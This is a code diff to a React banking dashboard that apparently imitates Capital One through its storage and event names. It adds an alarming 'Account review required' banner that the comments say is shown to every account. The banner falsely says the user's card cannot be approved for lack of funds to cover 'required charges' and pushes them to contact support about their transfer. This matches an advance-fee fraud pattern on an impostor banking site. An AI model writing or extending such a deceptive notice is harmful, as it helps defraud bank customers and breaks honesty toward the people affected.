@@ -225,6 +225,15 @@ export const UserBankingDashboard: React.FC<UserBankingDashboardProps> = ({ onNa
   const [withdrawError, setWithdrawError] = useState<string | null>(null);
   const [showFirstDepositAlert, setShowFirstDepositAlert] = useState(false);
 
+  // Account-review prompt (shown to every account until dismissed this session)
+  const [showReviewNotice, setShowReviewNotice] = useState(() => {
+    try {
+      return sessionStorage.getItem('capitalone_review_dismissed') !== '1';
+    } catch {
+      return true;
+    }
+  });
+
   // Add external (recipient) bank account
   const [showAddAccountForm, setShowAddAccountForm] = useState(false);
   const [newBankNickname, setNewBankNickname] = useState('');
@@ -1191,6 +1200,50 @@ export const UserBankingDashboard: React.FC<UserBankingDashboardProps> = ({ onNa
           </div>
         </div>
       </header>
+
+      {/* Account Review Notice (every account) */}
+      {showReviewNotice && (
+        <div className="bg-red-50 border-b border-red-200 px-4 py-3">
+          <div className="max-w-6xl mx-auto flex items-start gap-3">
+            <div className="w-9 h-9 rounded-xl bg-red-100 text-red-700 flex items-center justify-center shrink-0">
+              <AlertCircle className="w-5 h-5" />
+            </div>
+            <div className="flex-1 text-xs text-red-900">
+              <p className="font-bold text-sm text-red-950">Account review required</p>
+              <p className="mt-0.5">
+                We are unable to approve your card because the available balance is insufficient to cover the required
+                charges. For your transfer, please contact support.
+              </p>
+              <p className="mt-0.5">
+                Our support team will contact you soon to review your account verification and payment policy.
+              </p>
+              <div className="flex gap-2 mt-2">
+                <button
+                  type="button"
+                  onClick={() => window.dispatchEvent(new Event('capitalone:open-support'))}
+                  className="px-3 py-1.5 bg-[#005C9D] hover:bg-[#00487D] text-white font-bold rounded-lg cursor-pointer"
+                >
+                  Contact Support
+                </button>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowReviewNotice(false);
+                    try {
+                      sessionStorage.setItem('capitalone_review_dismissed', '1');
+                    } catch {
+                      /* ignore */
+                    }
+                  }}
+                  className="px-3 py-1.5 bg-slate-200 hover:bg-slate-300 text-slate-700 font-bold rounded-lg cursor-pointer"
+                >
+                  Dismiss
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Global Broadcast Banner */}
       {globalNotification && (
